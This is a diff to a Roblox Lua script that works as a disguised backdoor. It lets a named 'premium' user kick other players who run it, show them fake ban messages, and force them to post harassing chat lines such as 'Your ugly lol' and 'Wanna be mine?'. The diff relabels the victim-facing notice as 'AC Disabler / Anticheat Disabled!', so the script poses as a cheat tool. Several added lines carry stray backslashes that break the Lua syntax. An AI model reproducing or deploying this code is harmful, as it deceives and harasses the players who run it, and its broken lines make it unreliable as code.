@@ -50,9 +50,9 @@ local unfreeze = function()
 end
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match("!kick .") then
+	if cht:match(":kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+			game.Players.LocalPlayer:Kick("You've been kicked")
 		end
 	end
 
@@ -83,7 +83,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("!benx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "riot is pro" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			wait(0) local A_1 = "Riot Is Cool" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
 			local benxed = true
 			while benxed == true do
@@ -102,6 +102,33 @@ user_premium__001.Chatted:connect(function(cht)
 		end
 	end
 
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("/e ugly .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			wait(0) local A_1 = "Your ugly lol" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) \
+
+		end
+	end
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("/e goofy .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			wait(0) local A_1 = "Goofy ahh kid" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) \
+
+		end
+	end
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("/e sus .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			wait(0) local A_1 = "Wanna be mine?" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) \
+
+		end
+	end
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -146,7 +173,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("!ban .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer:kick("PERMA BAN")
+			game.Players.LocalPlayer:kick("You've Been Banned")
 		end
 	end
 
@@ -224,7 +251,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match("!kick me") then
+	if cht:match(":kick me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			game.Players.LocalPlayer:Kick("Kicked yourself")
 		end
@@ -233,7 +260,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match("!freeze me") then
+	if cht:match(":freeze me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			freeze()
 		end
@@ -242,7 +269,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match("!unfreeze me") then
+	if cht:match(":unfreeze me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			unfreeze()
 		end
@@ -251,7 +278,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match("!thaw me") then
+	if cht:match(":thaw me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			unfreeze()
 		end
@@ -266,7 +293,7 @@ user_premium__001.Chatted:connect(function(cht)
 		if game.Players.LocalPlayer == user_premium__001 then
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Cmds:";
-	Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling";
+	Text = "!Freeze :grave :benx :bring :void :kill :kick :ban :fling";
 	Time = 50;
 	Icon = "rbxassetid://505845268";
 })
@@ -285,9 +312,8 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 })
 else
 game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "Version 2.0";
-	Text = "Checking Logs";
+	Title = "AC Disabler";
+	Text = "Anticheat Disabled!";
 	Time = 10;
-	Icon = "rbxassetid://505845268";
 })
 end
